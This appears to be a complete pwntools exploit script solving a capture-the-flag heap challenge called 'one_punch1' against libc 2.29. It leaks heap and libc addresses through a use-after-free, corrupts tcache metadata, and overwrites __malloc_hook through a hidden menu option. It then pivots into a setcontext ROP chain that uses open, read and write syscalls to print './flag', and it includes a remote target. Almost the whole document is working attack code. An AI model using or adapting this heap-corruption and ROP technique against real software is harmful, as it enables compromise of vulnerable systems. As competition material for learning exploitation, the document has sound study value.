#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = 'one_punch1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc-2.29.so')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')

def eat():
    p.recvuntil('#   5. Exit                #\n')
    p.recvuntil('############################\n')
    p.recvuntil('> ')

def create(index,content):
    eat()
    p.sendline('1')
    p.recvuntil('idx: ')
    p.sendline(str(index))
    p.recvuntil('hero name: ')
    p.send(content)

def edit(index,content):
    eat()
    p.sendline('2')
    p.recvuntil('idx: ')
    p.sendline(str(index))
    p.recvuntil('hero name: ')
    p.send(content)

def show(index):
    eat()
    p.sendline('3')
    p.recvuntil('idx: ')
    p.sendline(str(index))

def delete(index):
    eat()
    p.sendline('4')
    p.recvuntil('idx: ')
    p.sendline(str(index))

def backdoor(content):
    eat()
    p.sendline('50056')
    sleep(0.1)
    p.send(content)

def debug():
    gdb.attach(p)
    pause()

bps = [0x133D]
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)


for i in range(7):
    create(0,'a'*0x400)# calloc 不用 tcache
    delete(0)

# leak_heap_addr
show(0)
p.recvuntil('hero name: ')
heap_base_addr = u64(p.recv(6).ljust(8, b'\x00')) - 0x16b0
log.success('heap_addr: ' + hex(heap_base_addr))

# leak_libc
create(0,'a'*0x400)
create(1, 'a' * 0x400)# 防止 top

delete(0)

show(0)
p.recvuntil('hero name: ')
unsorted_bin_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
log.success('unsorted_bin_addr: ' + hex(unsorted_bin_addr))
libc.address = unsorted_bin_addr - 0x1e4ca0
log.success('libc.address: ' + hex(libc.address))
__malloc_hook_addr = libc.symbols['__malloc_hook']
log.success('__malloc_hook_addr: ' + hex(__malloc_hook_addr))
__free_hook_addr = libc.symbols['__free_hook']
log.success('__free_hook_addr: ' + hex(__free_hook_addr))

for i in range(7):
    create(0,'a'*0xf0)# calloc 不用 tcache
    delete(0)
delete(1)

create(0, 'a' * 0x300)
create(0, 'a' * 0x300)

create(0, 'a' * 0x400)

create(1, 'a' * 0x400)# 防止 top

delete(0)
create(1, 'a' * 0x300)
create(1, 'a' * 0x300)

for i in range(2):
    create(1, 'a' * 0x217)
    delete(1)

payload = b'\x00'*0x300+p64(0)+p64(0x101)+p64(heap_base_addr+0x25e0)+p64(heap_base_addr+0x1f)# 很jb怪，0x90失败了。。。
edit(0,payload)

create(0, b'./flag'.ljust(0xf0,b'\x00'))

payload = p64(__free_hook_addr)
edit(1,payload)


backdoor('0')

add_rsp48h_addr = libc.address + 0x8cfd6 # add rsp, 0x48 ; ret
jmp_rax_addr = libc.address + 0x12BE97 # mov rdx, [rdi+8] ; mov rax, qword ptr [rdi] ; mov rdi, rdx ; jmp rax
payload = p64(jmp_rax_addr)
backdoor(payload)

open_addr = libc.symbols['open'] #直接 call 的话 syscall 了 openat，就 kill 了
read_addr = libc.symbols['read']
write_addr = libc.symbols['write']
syscall_ret = 0xcf6c5 + libc.address
setcontext_a35_addr = libc.symbols['setcontext'] + 0x35
rdi_ret = 0x26542 + libc.address
rsi_ret = 0x26f9e + libc.address
rdx_ret = 0x12bda6 + libc.address
rax_ret = 0x47cf8 + libc.address

flag_addr = heap_base_addr+0x25f0
rdi = flag_addr
rsi = 0
rdx = 0

rsp = heap_base_addr + 0x3d10
rbp = 1

rbx = 0
rcx = rax_ret

rdx_regi = heap_base_addr + 0x3c80 - 0x28

rop = flat(
setcontext_a35_addr,rdx_regi,
p64(0)*8,
rdi,rsi,rbp,
rbx,rdx,
p64(0)*2,
rsp,rcx,
rax_ret,# rop
2,# rsp
syscall_ret,
rdi_ret,3,rsi_ret,flag_addr,rdx_ret,0x50,rax_ret,0,syscall_ret,
rdi_ret,1,rsi_ret,flag_addr,rdx_ret,0x50,rax_ret,1,syscall_ret,
)
# gdba()
create(0,rop)
edit(0,rop)
# debug()
delete(0)


p.interactive()
